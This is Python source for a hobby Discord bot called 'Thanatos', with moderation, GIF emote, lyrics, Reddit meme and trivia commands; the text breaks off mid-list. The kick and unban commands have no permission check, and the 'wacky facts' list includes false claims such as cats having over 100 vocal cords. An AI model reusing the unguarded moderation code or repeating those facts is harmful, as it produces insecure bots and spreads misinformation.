from webserver import keep_alive
import os
import discord
import random
import requests 
import json
import aiohttp
import io
import textwrap
import urllib
import praw
import datetime
import numpy as np
import google
import asyncio
from discord.ext import commands
from discord.ext import tasks
from replit import db


try:
     from googlesearch import search 
except ImportError:
     print("No module found!")

client = commands.Bot(command_prefix=',')
client.remove_command("help")


#custom help command

@client.command()
async def str(ctx):
  await ctx.send("streak")

#--------------------------------------start-----------------------------------------

@client.group(invoke_without_command=True)
async def help(ctx):
#  em = discord.Embed(title = "Help", description = "use **.help <command>** for extended information on a command.", colour=ctx.author.color)

  #em.add_field(name = 'moderation', value = 'kick, ban, unban, clear', inline=False)
  #em.add_field(name="Games", value="guess", inline=False)
  #em.add_field(name="Fun & games", value="`meme` `joke` `triggered` `hello` `guess` `rockpaperscissor`", inline=False)
  #em.add_field(name = 'Text media', value = "`wackyfacts` `typeofguy` `existential_thought` `lyrics`", inline=False)
  #em.add_field(name = "Information", value="`purpose` `servers` `invite`", inline=False)
  #em.add_field(name = "Death", value="`Humanlifespan (hl)`", inline=False)
  #em.add_field(name = "About", value="`developer` `Home` `upcoming` `comic`", inline=False)
  #em.set_image(url="https://media.discordapp.net/attachments/919212015862558760/920281139581698078/unknown.png")
  #em.set_footer(text="some commands do not have extended info.")
  #await ctx.reply(embed = em, mention_author = False)
  await ctx.reply("https://media.discordapp.net/attachments/911947004303786065/943792857536397352/Untitled_design.png?width=811&height=406", mention_author=False)

@help.command()
async def kick(ctx):

  em = discord.Embed(title = 'kick', description = 'kicks a member from the guild', color = ctx.author.color)

  em.add_field(name = "**syntax**", value = '.kick <member> [reason]')

  await ctx.send(embed = em)


@help.command()
async def ban(ctx):

  em = discord.Embed(title = 'ban', description = 'bans a member from the guild', color = ctx.author.color)

  em.add_field(name = "**syntax**", value = '.ban <member> [reason]')

  await ctx.send(embed = em)  


@help.command()
async def unban(ctx):

  em = discord.Embed(title = 'unban', description = 'unbans a member from the guild', color = ctx.author.color)

  em.add_field(name = "**syntax**", value = '.unban <member>')

  await ctx.send(embed = em)  


@help.command(aliases = ['8ball'])
async def _8ball(ctx):

  em = discord.Embed(title = '8ball', description = 'gives you a randomly generated affirmative, neutral or non-affirmative answer', color = ctx.author.color)

  em.add_field(name = "**syntax**", value = '.8ball <question>')

  await ctx.send(embed = em)  


@help.command()
async def ping(ctx):

  em = discord.Embed(title = 'ping', description = 'tells you your ping in ms', color = ctx.author.color)

  em.add_field(name = "**syntax**", value = '.ping')

  await ctx.send(embed = em)  


@help.command()
async def meme(ctx):

  em = discord.Embed(title = 'meme', description = 'sends random memes from reddit', color = ctx.author.color)

  em.add_field(name = "**syntax**", value = '.meme')

  await ctx.send(embed = em)   

@help.command()
async def clear(ctx):

  em = discord.Embed(title = 'clear', description = 'clears messages', color = ctx.author.color)

  em.add_field(name = "**syntax**", value = '.clear <number of messages>')

  await ctx.send(embed = em) 

@help.command(aliases = ['wacky facts'])
async def wackyfacts(ctx):

  em = discord.Embed(title = 'wacky facts', description = 'gives a random wacky fact to ruin your day!', color = ctx.author.color)

  em.add_field(name = "**syntax**", value = '.wackyfact')

  await ctx.send(embed = em)  

@help.command()
async def typeofguy(ctx):

  em = discord.Embed(title = 'typeofguy', description = 'cracks a type of guy joke', color = ctx.author.color)

  em.add_field(name = "**syntax**", value = '.guy ')

  await ctx.send(embed = em)  

@help.command(aliases=["et"])
async def existential_thought(ctx):

  em = discord.Embed(title = 'existential_thought', description = 'can give you an existential crisis', color = ctx.author.color)

  em.add_field(name = "**syntax**", value = '.et (or) .extho (or) .existential_thought')

  await ctx.send(embed = em)  

@help.command()
async def triggered(ctx):

  em = discord.Embed(title = 'triggered', description = "Returns a gif of the user's pfp with the triggered filter", color = ctx.author.color)

  em.add_field(name = "**syntax**", value = '.triggered [or] .triggered <@member>')

  await ctx.send(embed = em)

@help.command()
async def lyrics(ctx):

  em = discord.Embed(title = 'lyrics', description = 'Forgot the name of a song or just want to know the lyrics of it ? \nThis one is for you', color = ctx.author.color)

  em.add_field(name = "**syntax**", value = '.lyrics <enter a line of lyric or just the song name>')

  await ctx.send(embed = em)

@help.command()
async def guess(ctx):

  em = discord.Embed(title = 'guess', description = 'A little number guessing game', color = ctx.author.color)

  em.add_field(name = "**syntax**", value = '.guess (or) .num (or) .number')

  await ctx.send(embed = em)

@help.command(aliases=["hl"])
async def humanlifespan(ctx):

  em = discord.Embed(title = 'Human Lifespan', description = 'A brief visual presentation of human lifespan data throughout history', color = ctx.author.color)

  em.add_field(name = "**syntax**", value = '.humanlifespan (or) .hl')

  await ctx.send(embed = em)  

@help.command()
async def comic(ctx):

  em = discord.Embed(title = 'comic', description = 'Returns a comic by Hades Allagi when you run this command', color = ctx.author.color)

  em.add_field(name = "**syntax**", value = '.comic<comic number>')

  await ctx.send(embed = em)

@help.command(aliases=["rps"])
async def rockpaperscissor(ctx):

  em = discord.Embed(title = 'Rock Paper scissors', description = 'Play the classic RPS game with me', color = ctx.author.color)

  em.add_field(name = "**syntax**", value = '.rps')

  await ctx.send(embed = em)   


  #---------------------------------------end----------------------------------------

#bot is ready
@client.event
async def on_ready():
  await client.change_presence(status=discord.Status.online, activity=discord.Game('with Death!'))
  print('Thanatos is online.')

#----------------------------------------------------------------------------------

#code to greet
@client.command()
async def hello(ctx):
  greets = ['Greetings mere mortal!',
            'How do you do, puny human?',
            'Hello there, insignificant being!',
            'fancy meeting you, dull creature!',
            "How's it going, minuscule living being?",
            "Welcome, young sapient!"]
  greet=discord.Embed(title=f"{random.choice(greets)}", colour=discord.Color(0x95a5a6))          
  await ctx.reply(embed = greet, mention_author = False)

#------------------------------------------------------------------------------------
          
#code to check the ping
@client.command()
async def ping(ctx):
    
    pings = discord.Embed(title="", colour=discord.Color(0x95a5a6))
    pings.add_field(name="Your ping is :", value=f" {round(client.latency * 1000)} ms")

    await ctx.reply(embed = pings)

#--------------------------------server no. display----------------------------------
@client.command()
async def servers(ctx):
  embed=discord.Embed(title="Servers with Thanatos", description=f"I am currently in **{len(client.guilds)}** servers. \nType .invite to invite me to your own!", colour=discord.Color(0x95a5a6))
  embed.set_thumbnail(url="https://images-ext-1.discordapp.net/external/i4U9xlIMijrKBX3Ht8sBTsz45BEfNwDA797AXyllMSo/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/879763218543808512/d983db3d8c77d9eb05dae3fa18120e7b.webp")
  await ctx.send(embed=embed)

@client.command()
async def membercount(ctx):
  embed=discord.Embed(title="Total Member Count", description=f"There are **{ctx.guild.member_count}** members in this server currently", color=discord.Colour.blurple())
  embed.set_thumbnail(url=ctx.guild.icon_url)
  await ctx.send(embed=embed)

#------------------------------------Invite-----------------------------------------

@client.command()
async def invite(ctx):
  embed=discord.Embed(url="https://discord.com/api/oauth2/authorize?client_id=879763218543808512&permissions=277028662336&scope=bot", title="Invite!",description="Thanks for inviting me!", colour=discord.Color(0x95a5a6))
  embed.set_thumbnail(url="https://images-ext-1.discordapp.net/external/i4U9xlIMijrKBX3Ht8sBTsz45BEfNwDA797AXyllMSo/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/879763218543808512/d983db3d8c77d9eb05dae3fa18120e7b.webp")
  await ctx.reply(embed=embed, mention_author = False)

#------------------------------------Moderation--------------------------------------
safwan=855488228387979294
#code to clear messages
@client.command()
@commands.has_permissions(manage_messages=True)
async def clear(ctx, amount=1):
  await ctx.channel.purge(limit=amount+1)


#code to ban and kick users  
@client.command()
async def kick(ctx, member : discord.Member, *, reason=None):
  await member.kick(reason=reason)
  await ctx.send(f'{member} was kicked into Tartarus!')

@client.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member : discord.Member, *, reason=None):
  await member.ban(reason=reason)
  if not reason:
    await member.send(f"You have been banned in {ctx.guild} by {ctx.author}")
  else:
    await member.send(f"You have been banned in {ctx.guild} for {reason} by {ctx.author}")
  await ctx.send(f'{member} was banned from the server!')


#code to unban users
@client.command()
async def unban(ctx, *, member):
  banned_users = await ctx.guild.bans()
  member_name, member_discriminator = member.split('#')

  for ban_entry in banned_users:
    user = ban_entry.user

    if (user.name, user.discriminator) == (member_name, member_discriminator):
      await ctx.guild.unban(user)
      await ctx.send(f'{user.name}#{user.discriminator} was unbanned.')
      return

@client.event
async def on_message_delete(message):
  if message.guild.id == 880410643310718986:
    embed=discord.Embed(description=f"message deleted in {message.channel}", color=discord.Colour.dark_grey())
    embed.add_field(name="content", value=message.content, inline=True)
    embed.set_footer(text=f"user ID : {message.author.id}")
    embed.set_author(name=message.author, icon_url=message.author.avatar_url)
    channel=client.get_channel(908733893337808937)
    await channel.send(embed=embed)

@client.event
async def on_message_edit(message_before, message_after):
  if message_before.guild.id == 880410643310718986:
    embed=discord.Embed(description=f"message edited in {message_before.channel}", color=discord.Colour.dark_grey())
    embed.add_field(name="Before", value=message_before.content, inline=False)
    embed.add_field(name="after", value=message_after.content, inline=False)
    embed.set_footer(text=f"user ID : {message_before.author.id}")
    embed.set_author(name=message_before.author, icon_url=message_before.author.avatar_url)
    channel=client.get_channel(908733893337808937)
    await channel.send(embed=embed)    


@client.event
async def on_member_join(ctx, *, member):
  if ctx.guild.id == 880410643310718986 :
    channel = member.server.get_channel("880410643310718988")
    embed=discord.Embed(title="welcome", description=f"<a:Nitro_boosting_level:934707958833631262> Hey {member.mention}! Glad to have you here <a:Nitro_boosting_level:934707958833631262>\nGet some roles from <#880462057647009853>\nand say hi to people in <#880410643763720192>", color=discord.Colour.gold())
    await ctx.channel.send(embed=embed)

intents = discord.Intents.default()
intents.members=True
@client.command()
async def welcome(ctx,*,member: discord.Member=None):
  if not member:
    member=ctx.author
  channel = ctx.guild.get_channel("880410643310718988")
  embed=discord.Embed(title="welcome", description=f"<a:Nitro_boosting_level:934707958833631262> Hey {member.mention}! Glad to have you here <a:Nitro_boosting_level:934707958833631262>\nCongratulations on joining {ctx.guild.name}\nsay hi to people in chat & get some roles", color=discord.Colour.gold())
  embed.set_thumbnail(url=member.avatar_url)
  await ctx.send(embed=embed)

@client.command()
async def hundred(ctx,*,member: discord.Member=None):
  if ctx.author.id == 855488228387979294:
    embed=discord.Embed(title="100th MEMBER CELEBRATION", description=f"<a:Confetti1:934759916483256380> Congratulations {member.mention}, you are the 100th member in mami's basement <a:Confetti1:934759916483256380>", color=discord.Colour.gold())
    embed.set_image(url="https://c.tenor.com/cGsXwVmKPaMAAAAC/celebration-dull.gif")
    embed.set_thumbnail(url=member.avatar_url)
    embed.set_footer(text="Ask for anything from the owner !",icon_url="https://images-ext-1.discordapp.net/external/iGaqx5wxhD3donXeTxSxwBZERG_WcwcsNGyDmZRxPMA/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/529749770290593793/f4d7be63fca38542985ffa89837bd341.webp")
    await ctx.send(embed=embed)
  else:
    pass

@client.command()
async def toggle(ctx,com):
  if com == "true":
    toggle=True
  elif com == "false":
    toggle=False
    await ctx.send("reaction toggle set to : `False`\n will not react to 'yuta'")
    

@client.event
async def on_message(message):
  channel=message.channel
  if message.author.bot:
        return  
#  if "yuta" in message.content:
#    await message.add_reaction("🤮")    
  await client.process_commands(message)

#---------------------------------------About----------------------------------------

@client.command(aliases=["dev","creator","owner"])
async def developer(ctx):
  embed=discord.Embed(title="Developer", description="My developer is Hades Allagi",colour=discord.Color.dark_grey())
  embed.set_image(url="https://media.discordapp.net/attachments/910903403360702544/915149462203150357/WhatsApp_Image_2021-11-06_at_6.11.51_PM.jpeg?width=759&height=427")
  await ctx.send(embed=embed)

@client.command(aliases=["server","underworld"])
async def home(ctx):
  embed=discord.Embed(title="Home Server",url="https://discord.gg/HSjKNuHAzJ", description="This is the officail server of Hades Allagi. You can get updates on my features here and also check out some of Allagi's work. Click the title to join!",colour=discord.Color.dark_grey())
  embed.set_image(url="https://media.istockphoto.com/vectors/greek-gods-and-goddess-hades-vector-id1188397160?k=20&m=1188397160&s=170667a&w=0&h=yKfNe_E9SpyqXJUXvcXTSM3JSKycUuBidLPjaxr84YA=")
  await ctx.send(embed=embed)


#------------------------------------------------------------------------------------  
# This is the code for 8 ball
@client.command(aliases = ['8ball'])
async def ball(ctx, *, question):
  responses = ['It is certain.',
               'It is decided so.',
               'Without a doubt.',
               'Yes definitely.',
               'You may rely on it.',
               'As I see it, yes.',
               'Most likely.',
               'Outlook good.',
               'Yes.',
               'Signs point to yes.',
               'Reply hazy, try again.',
               'Ask again later.',
               'Better not tell you now.',
               'Cannot predict now.',
               'Concentrate and ask again.',
               "Don't count on it.",
               'My reply is no.',
               'My sources say no.',
               'Outlook not so good.',
               'Very doubtful.']
  res=discord.Embed(title="", description=f'**Question:** {question}\n**Answer:** {random.choice(responses)}', colour=discord.Color(0x95a5a6))             
  await ctx.reply(embed = res, mention_author = False)  

#------------------------------------------------------------------------------------
# EMOTES


@client.command()
async def kill(ctx, member: discord.Member=None):
  if not member:
    member=ctx.author 
  kill_gifs=["https://i.pinimg.com/originals/83/c5/1a/83c51a311ba48f98822f5f68b1849474.gif","https://img.memecdn.com/monkey-kills-bieber_o_615429.gif","https://i.makeagif.com/media/1-29-2017/8xO0gn.gif","https://c.tenor.com/m8jCmL4M4lUAAAAM/shooting-the-office.gif","https://c.tenor.com/BNAk4BXVWsoAAAAM/kill-stab.gif","https://c.tenor.com/A8zBZk9FtEcAAAAM/kill-mouse.gif","https://c.tenor.com/zopcO8RpVpUAAAAM/kill-yourself-killing-me-smalls.gif","https://c.tenor.com/-tA7D6xBOFgAAAAM/death-note-hey.gif","https://c.tenor.com/bpUkzrcLRxEAAAAM/axe-axe-murderer.gif","https://c.tenor.com/Fzuj3Tzj6N8AAAAC/ill-find-you-i-will-kill-you.gif","https://c.tenor.com/Bn7xKbLvYzsAAAAM/annabelle-horror.gif"]
  killing=["absolutely slays","decimates","annihilates","wrecks"]  
  embed= discord.Embed(title=f"{ctx.author.name} {random.choice(killing)} {member.name} !", color=discord.Colour.dark_grey())
  embed.set_image(url=random.choice(kill_gifs))
  await ctx.send(embed=embed)

@client.command()
async def hug(ctx, member: discord.Member=None):
  if not member:
    member=ctx.author 
  hugging=["https://c.tenor.com/_2pEd0BEJSsAAAAM/hug-i-missed-you-friends.gif","https://c.tenor.com/5tkkWFegYvUAAAAM/hug-couple.gif","https://c.tenor.com/Oje4abW91-kAAAAM/puuung-puung.gif","https://c.tenor.com/Z4JgKkMhyDUAAAAM/hugs-and-love-hug.gif","https://c.tenor.com/0ufkUZYNrb4AAAAM/puuung-cute.gif","https://c.tenor.com/5IEuBNcIWP8AAAAM/quby-hug.gif","https://c.tenor.com/oPIi24wF8ucAAAAM/hug-virtual-hug.gif","https://c.tenor.com/XyECfmRs0KMAAAAM/virtual-hug.gif","https://c.tenor.com/ehEjYwLbVyAAAAAM/dog-hug.gif","https://c.tenor.com/hWbLbngbhIAAAAAM/big-hero6-baymax.gif","https://c.tenor.com/qj_wTx9dXVMAAAAM/cat-hug.gif"]  
  embed= discord.Embed(title=f"{ctx.author.name} hugs {member.name} !", color=discord.Colour.dark_grey())
  embed.set_image(url=random.choice(hugging))
  await ctx.send(embed=embed)

@client.command()
async def slap(ctx, member: discord.Member=None):
  if not member:
    member = ctx.author
  slapping=["https://c.tenor.com/wvCSg5-wYssAAAAM/nope-stupid.gif","https://c.tenor.com/gXUhWuB6QDkAAAAM/family-guy-smack.gif","https://c.tenor.com/An1M1IByKBUAAAAM/slap-annoyed.gif","https://c.tenor.com/Hjvjo_lqrpIAAAAM/slap-head.gif","https://c.tenor.com/UHUTif2p1w0AAAAM/slap-come-here.gif","https://c.tenor.com/tpBsJof2_SsAAAAM/penguin-smack-head.gif","https://c.tenor.com/zEIIZKfyEVUAAAAM/family-guy-brian-griffin.gif","https://c.tenor.com/3gXMa4UqiGgAAAAM/slap-slow-motion-slap.gif","https://c.tenor.com/PTONt_7DUTgAAAAM/batman-slap-robin.gif"]
  embed= discord.Embed(title=f"{ctx.author.name} slaps the living soul outta {member.name} !!", color=discord.Colour.dark_grey())
  embed.set_image(url=random.choice(slapping))
  await ctx.send(embed=embed)

@client.command()
async def punch(ctx, member: discord.Member=None):
  if not member:
    member = ctx.author
  punching=["https://c.tenor.com/PYOgLkcIxvoAAAAM/stepbrothers-pummel-punch.gif","https://c.tenor.com/w99KgsJscigAAAAM/lulugifs-charlie-brown.gif","https://c.tenor.com/4p0TgJHX69sAAAAM/punching-fight.gif","https://c.tenor.com/szPtb6lqakIAAAAM/beating-up-beating-up-lilo.gif","https://c.tenor.com/Q8L-Fq7ZMecAAAAM/funny-fight.gif","https://c.tenor.com/msZfY4pFerIAAAAM/punch-meme.gif","https://c.tenor.com/QeTLGgXG6h4AAAAM/angry-cute.gif","https://c.tenor.com/-dK24mwTyKwAAAAM/tv-shows-supernatural.gif","https://c.tenor.com/UlL4v-hsjVEAAAAM/punch-anna.gif"]
  embed= discord.Embed(title=f"{ctx.author.name} punches {member.name} so hard that they are dead.", color=discord.Colour.dark_grey())
  embed.set_image(url=random.choice(punching))
  await ctx.send(embed=embed)  

@client.command()
async def dance(ctx, member: discord.Member=None):
  if not member:
    member = ctx.author
  dancing=["https://c.tenor.com/fJh-W38iA3oAAAAM/dance-kid.gif","https://c.tenor.com/y_NLohYyZ6EAAAAM/playit-chuckberrystyle.gif",
  "https://c.tenor.com/jYqfbfE5wU4AAAAM/yay-yes.gif",
  "https://c.tenor.com/mfe3zlV4uZUAAAAM/ron-clark-academy-jaycob.gif","https://c.tenor.com/rlE_CTcXPQkAAAAM/happy-dancing.gif",
  "https://c.tenor.com/jW2A3cRw8xMAAAAM/dance-dances.gif",
  "https://c.tenor.com/9xx5jJaHPpIAAAAM/fat-guy.gif",
  "https://c.tenor.com/_n0Itj45UioAAAAM/nikaru22-dancing-uncle.gif",
  "https://c.tenor.com/Rvg85hYcpHgAAAAd/kermit-dancing.gif"]
  embed=discord.Embed(title=f"{ctx.author.name} dances like a prince !", color=discord.Colour.dark_grey())
  embed.set_image(url=random.choice(dancing))
  await ctx.send(embed=embed)    

@client.command(aliases=["greet"])
async def wave(ctx, member:discord.Member=None):
  waving=["https://c.tenor.com/PTmve-UgopkAAAAM/groot-baby.gif",
  "https://c.tenor.com/Dhrbmr_t3tEAAAAM/forrest-gump-hello.gif",
  "https://c.tenor.com/nyCK9qLmOK0AAAAM/hello-penguin.gif",
  "https://c.tenor.com/KP0vkZ21aioAAAAM/mandalorian-baby-yoda.gif",
  "https://c.tenor.com/PKqiq0INpC8AAAAM/inflatable-dancing.gif",
  "https://c.tenor.com/7mTgBXvnNWEAAAAM/hello-wave.gif",
  "https://c.tenor.com/aAKLiVpjj3UAAAAM/hello-kitten.gif",
  "https://c.tenor.com/FnyuCy6eJ1IAAAAM/mr-bean-funny.gif",
  "https://c.tenor.com/dnJFN-Zesb0AAAAM/up-wave.gif",
  "https://c.tenor.com/Ohg8xmwadeAAAAAM/rio-hello.gif",
  "https://c.tenor.com/BnEKiDKJisEAAAAM/claire-dancing.gif"]
  if not member:
    embed=discord.Embed(title=f"{ctx.author.name} waves at ya !", color=discord.Colour.dark_grey())
    embed.set_image(url=random.choice(waving))
    await ctx.send(embed=embed)
  emb=discord.Embed(title=f"{ctx.author.name} waves at {member.name}")
  emb.set_image(url=random.choice(waving))
  await ctx.send(embed=emb) 
    
@client.command()
async def kiss(ctx, member:discord.Member=None):
  kissing=["https://c.tenor.com/4TRtWjDugwEAAAAM/hug-love.gif",
  "https://c.tenor.com/LYTZyVheW78AAAAM/blowing-kisses-emoji.gif",
  "https://c.tenor.com/VILLuQkVde4AAAAM/smooch-blow-kiss.gif",
  "https://c.tenor.com/5FrkoY5oplQAAAAM/love-you.gif",
  "https://c.tenor.com/p5Hn67N9co8AAAAM/love-you-kisses.gif",
  "https://c.tenor.com/4vrESbUOQQAAAAAM/sponge-bob-square-pants-blowing-kisses.gif"]
  if not member:
    await ctx.reply("you cannot kiss nobody weirdo", mention_author=False)
  embed=discord.Embed(title=f"{ctx.author.name} gives {member.name} a huge kiss!")
  embed.set_image(url=random.choice(kissing))
  await ctx.send(embed=embed)  

@client.command(aliases = ['hi5','highfive','hifive','high5'])
async def high_five(ctx, member: discord.Member=None):
  high=["https://c.tenor.com/uHSWiu1Jk2MAAAAM/base-high-five.gif",
  "https://c.tenor.com/cblmph1eXKgAAAAM/high-five-hi-five.gif",
  "https://c.tenor.com/2oPrdhJpUpEAAAAM/kuzco-yzma.gif",
  "https://c.tenor.com/RYmb3nafbdIAAAAM/high-five-come-on-bro.gif",
  "https://c.tenor.com/ekBfsXahvWsAAAAM/bakabaka7-high-five.gif",
  "https://c.tenor.com/k0VGzUg0QOMAAAAM/high-five-barney-stinson.gif",
  "https://c.tenor.com/LFAmIvSqdfkAAAAM/the-hacksmith-science.gif",
  "https://c.tenor.com/WqceqTTRlFQAAAAM/adventure-time-up-high.gif",
  "https://c.tenor.com/ajgXU4qPuUcAAAAM/child-high-five.gif",
  "https://c.tenor.com/dyv4gGD6T1cAAAAM/%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82-%D0%B4%D0%B0%D0%B9%D0%BF%D1%8F%D1%82%D1%8C.gif"]
  if not member:
    embed=discord.Embed(
      title=f"{ctx.author.name} High fives himself",
      color=discord.Colour.dark_grey()
    )
    embed.set_image(url="https://c.tenor.com/0y4YKq5MfzoAAAAj/celebrating-myself-mental-health.gif")
    await ctx.send(embed=embed)
  emb=discord.Embed(
    title=f"{ctx.author.name} high fives {member.name}",
    color=discord.Colour.dark_grey()
  )  
  emb.set_image(url=random.choice(high))
  await ctx.send(embed=emb)

@client.command(aliases=["fistbump","bumpfists"])
async def fist_bump(ctx, member: discord.Member=None):
  bump=["https://c.tenor.com/GhgBLbxm1OUAAAAM/the-office-michael-scott.gif",
  "https://c.tenor.com/SJB6qh5DpCsAAAAM/free-anime.gif",
  "https://c.tenor.com/RVL9MMi9gi8AAAAM/fist-bump-big-hero-six.gif",
  "https://c.tenor.com/EdbKVcCdzlsAAAAM/army-fist-bump.gif",
  "https://c.tenor.com/JAHq-B757hQAAAAM/black-handshake.gif",
  "https://c.tenor.com/8VQi7NvafBUAAAAM/nice-handshake.gif",
  "https://c.tenor.com/OtmvQ8ggmbgAAAAM/ultraman-trigger-ultraman.gif",
  "https://c.tenor.com/unVfPlCNP7IAAAAM/fist-bump-otter.gif",
  "https://c.tenor.com/3R7fsXfConwAAAAM/sheldon-copper-the-big-bang-theory.gif",
  "https://c.tenor.com/NM1M4FWaCToAAAAM/disney-baymax.gif",
  "https://c.tenor.com/14L1Fg8rJooAAAAM/anime-moon.gif"]
  if not member:
    member=ctx.author
  embed=discord.Embed(
    title=f"{ctx.author.name} fist bumps {member.name}",
    color=discord.Colour.dark_grey()
  )  
  embed.set_image(url=random.choice(bump))
  await ctx.send(embed=embed)  

@client.command()
async def blush(ctx):
  blushing=["https://c.tenor.com/BajHEiplPOIAAAAM/joey-tribbiani-friends.gif",
  "https://c.tenor.com/gw0pBnFHj9EAAAAM/shy-blushing.gif",
  "https://c.tenor.com/O_XnMP_7K0AAAAAM/embarrassed-shy.gif",
  "https://c.tenor.com/DtgfUZeeuk8AAAAM/vtuber-anime.gif",
  "https://c.tenor.com/JNl7IxKAoPYAAAAM/dog-cute.gif",
  "https://c.tenor.com/WyZOaRCGzWkAAAAM/blush-skeleton.gif",
  "https://c.tenor.com/LI1-BdKICjwAAAAM/psyduck-pokemon.gif"]
  embed=discord.Embed(title=f"{ctx.author.name}'s face is red!")
  embed.set_image(url=random.choice(blushing))
  await ctx.send(embed=embed)  

saddam=["https://c.tenor.com/yVgagcvX-KQAAAAM/girl-please-saddam.gif",
"https://c.tenor.com/xI6mLJDTUYgAAAAM/saddam-hussein-saddam-my-beloved.gif",
"https://c.tenor.com/58MHehmspf8AAAAM/saddam-hussein-adobada.gif",
"https://c.tenor.com/Tzp2Yn-Q1r0AAAAM/saddam-hussein-iraq.gif",
"https://c.tenor.com/5ygsmhAjfWwAAAAM/saddam-hussein-talking.gif",
"https://c.tenor.com/1KBGEuZHv_0AAAAM/saddam-oh-no.gif",
"https://c.tenor.com/2JCg12Y1MOQAAAAM/%D8%B5%D8%AF%D8%A7%D9%85-saddam.gif"]
@client.command()
async def saddam(ctx):
  await ctx.send(random.choice(saddam))  

@client.command(aliases=["av","pfp"])
async def avatar(ctx,member: discord.Member=None):
  if not member:
    member = ctx.author
  embed=discord.Embed(color=discord.Colour.dark_grey())
  embed.set_author(name=ctx.author, icon_url=ctx.author.avatar_url) 
  embed.set_image(url=member.avatar_url)
  await ctx.send(embed=embed) 


#triggered
@client.command()
async def triggered(ctx, member: discord.Member=None):
  if not member:
    member = ctx.author

  async with aiohttp.ClientSession() as trigSession:
    async with trigSession.get(f'https://some-random-api.ml/canvas/triggered?avatar={member.avatar_url_as(format="png", size=1024)}') as trigImg:
      imageData = io.BytesIO(await trigImg.read())

      await trigSession.close()

      await ctx.reply(file=discord.File(imageData, 'triggered.gif'), mention_author = False)    




#------------------------------------------------------------------------------------
#lyrics
@client.command(aliases = ['l', 'lyrc', 'lyric']) # adding aliases to the command so they they can be triggered with other names
async def lyrics(ctx, *, search = None):
    """A command to find lyrics easily!"""
    if not search: # if user hasnt given an argument, throw a error and come out of the command
        embed = discord.Embed(
            title = "No search argument!",
            description = "You havent entered anything, so i couldnt find lyrics!"
        )
        return await ctx.reply(embed = embed)
        # ctx.reply is available only on discord.py version 1.6.0, if you have a version lower than that use ctx.send
    
    song = urllib.parse.quote(search) # url-encode the song provided so it can be passed on to the API
    
    async with aiohttp.ClientSession() as lyricsSession:
        async with lyricsSession.get(f'https://some-random-api.ml/lyrics?title={song}') as jsondata: # define jsondata and fetch from API
            if not 300 > jsondata.status >= 200: # if an unexpected HTTP status code is recieved from the website, throw an error and come out of the command
                return await ctx.send(f'Recieved poor status code of {jsondata.status}')

            lyricsData = await jsondata.json() # load the json data into its json form

    error = lyricsData.get('error')
    if error: # checking if there is an error recieved by the API, and if there is then throwing an error message and returning out of the command
        return await ctx.send(f'Recieved unexpected error: {error}')

    songLyrics = lyricsData['lyrics'] # the lyrics
    songArtist = lyricsData['author'] # the author's name
    songTitle = lyricsData['title'] # the song's title
    songThumbnail = lyricsData['thumbnail']['genius'] # the song's picture/thumbnail


    for chunk in textwrap.wrap(songLyrics, 4096, replace_whitespace = False):
        embed = discord.Embed(
            title = songTitle,
            description = chunk,
            color = discord.Color.blurple(),
            timestamp = datetime.datetime.utcnow()
        )
        embed.set_thumbnail(url = songThumbnail)
        await ctx.send(embed = embed)

        
@client.command(pass_context=True)
async def meme(ctx):
    

    async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/memes/new.json') as r:
            res = await r.json()
            embed = discord.Embed(title="", description="")
            embed.set_image(url=res['data']['children'] [random.randint(0,20)]['data']['url'])
            await ctx.send(embed=embed)

@client.command(pass_context=True, aliases=["wtfsp","1"])
async def wtfstockphotos(ctx):
    

    async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/wtfstockphotos/new.json') as r:
            res = await r.json()
            embed = discord.Embed(title="", description="")
            embed.set_image(url=res['data']['children'] [random.randint(0,20)]['data']['url'])
            await ctx.send(embed=embed)

@client.command(pass_context=True, aliases=["sfp","2"])
async def shittyfoodporn(ctx):
    

    async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/shittyfoodporn/new.json') as r:
            res = await r.json()
            embed = discord.Embed(title="", description="")
            embed.set_image(url=res['data']['children'] [random.randint(0,20)]['data']['url'])
            await ctx.send(embed=embed)

@client.command(pass_context=True, aliases=["ci","3"])
async def cursedimages(ctx):
  if ctx.channel.is_nsfw():
    async with aiohttp.ClientSession() as cs:
      async with cs.get('https://www.reddit.com/r/cursedimages/new.json') as r:
            res = await r.json()
            embed = discord.Embed(title="", description="")
            embed.set_image(url=res['data']['children'] [random.randint(0,20)]['data']['url'])
            await ctx.send(res['data']['children'] [random.randint(0,20)]['data']['url'])
  else:
    embed=discord.Embed(title="NSFW is not allowed in this channel!", description="This is a potentially NSFW command, it requires you to use it in a channel that has NSFW settings on. OR you could just turn it on for this channel")
    embed.set_image(url="https://images-ext-2.discordapp.net/external/hiWbEzhiEXfFaza5khoxg3mR3OWeugZwWo8vGxK8LzA/https/i.imgur.com/oe4iK5i.gif")
    await ctx.send(embed=embed)             

@client.command(pass_context=True, aliases=["eyebleach","eb"])
async def eyeblech(ctx):
  if ctx.channel.is_nsfw():
    async with aiohttp.ClientSession() as cs:
      async with cs.get('https://www.reddit.com/r/eyeblech/new.json') as r:
            res = await r.json()
            embed = discord.Embed(title="", description="")
            embed.set_image(url=res['data']['children'] [random.randint(0,20)]['data']['url'])
            await ctx.send(res['data']['children'] [random.randint(0,20)]['data']['url'])
  else:
    embed=discord.Embed(title="NSFW is not allowed in this channel!", description="This is a potentially NSFW command, it requires you to use it in a channel that has NSFW settings on. OR you could just turn it on for this channel")
    embed.set_image(url="https://images-ext-2.discordapp.net/external/hiWbEzhiEXfFaza5khoxg3mR3OWeugZwWo8vGxK8LzA/https/i.imgur.com/oe4iK5i.gif")
    await ctx.send(embed=embed)
#------------------------------------------------------------------------------------
#tells random wacky facts
@client.command(aliases = ['wacky fact'])
async def wackyfact(ctx):
  wackyfacts = ['Animals that lay eggs don’t have belly buttons.',
                'Camels have three eyelids.',
                'There is a McDonalds in every continent except Antarctica.',
                'Mosquitos are attracted to people who just ate bananas.',
                'In South Korea, there is an emergency number to report suspected spies','Cats have over 100 vocal cords.',
                'Sonic the Hedgehog’s full name is Ogilvie Maurice Hedgehog.',
                'The world’s termites outweigh the world’s humans about 10 to 1.',
                'Most toilet paper sold in France is pink.',
                'The Hawaiian alphabet only has 12 letters.',
                'The human nose can remember 50,000 different scents.',
                'Children tend to grow faster in the spring.',
